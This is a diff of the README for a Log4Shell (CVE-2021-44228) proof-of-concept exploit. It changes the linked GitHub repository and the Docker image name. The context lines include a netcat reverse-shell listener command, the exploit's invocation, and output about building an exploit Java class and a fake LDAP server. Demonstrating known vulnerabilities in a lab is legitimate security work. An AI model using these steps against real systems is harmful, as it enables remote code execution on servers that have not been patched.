@@ -48,7 +48,7 @@ nc -lvnp 9001
 $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 
 [!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+[!] Github repo: https://github.com/turbomaster95/log4j-poc-shell
 
 [+] Exploit java class created success
 [+] Setting up fake LDAP server
@@ -68,8 +68,8 @@ Our vulnerable application
 
 We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
 ```c
-1: docker build -t log4j-shell-poc .
-2: docker run --network host log4j-shell-poc
+1: docker build -t log4j-poc-shell .
+2: docker run --network host log4j-poc-shell
 ```
 Once it is running, you can access it on localhost:8080
 
